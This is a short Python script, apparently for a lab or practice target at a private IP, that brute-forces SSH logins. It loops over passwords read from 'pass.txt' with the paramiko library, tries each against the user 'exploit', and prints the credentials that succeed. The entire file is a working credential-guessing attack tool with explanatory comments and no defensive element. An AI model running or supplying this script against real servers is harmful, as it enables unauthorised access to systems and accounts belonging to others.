# Import necessary modules
from pwn import *
import paramiko
from paramiko.client import SSHClient

# Define SSH connection details
SSH_USER = "exploit"
SSH_HOST = "192.168.1.196"
SSH_PORT = 22

# Open and read the password file 'pass.txt'
with open('pass.txt') as pw:
    # Read each line from the file and remove trailing newline characters ('\n')
    lines = [line.rstrip() for line in pw]

# Iterate through each line in the password file
for x in lines:
    # Create an SSH client instance
    client = SSHClient()

    # Load system host keys (known hosts)
    client.load_system_host_keys()
    try:
        # Attempt to establish an SSH connection
        client.connect(SSH_HOST, port=SSH_PORT,
                       username=SSH_USER,
                       password=x,
                       look_for_keys=False)
        # If the connection is successful, print a success message and break out of the loop
        print(f"Connected successfully with User: {SSH_USER} and Password: {x}")
        break
    except Exception:
        # If the connection fails, print an error message
        print("Failed to establish connection.")
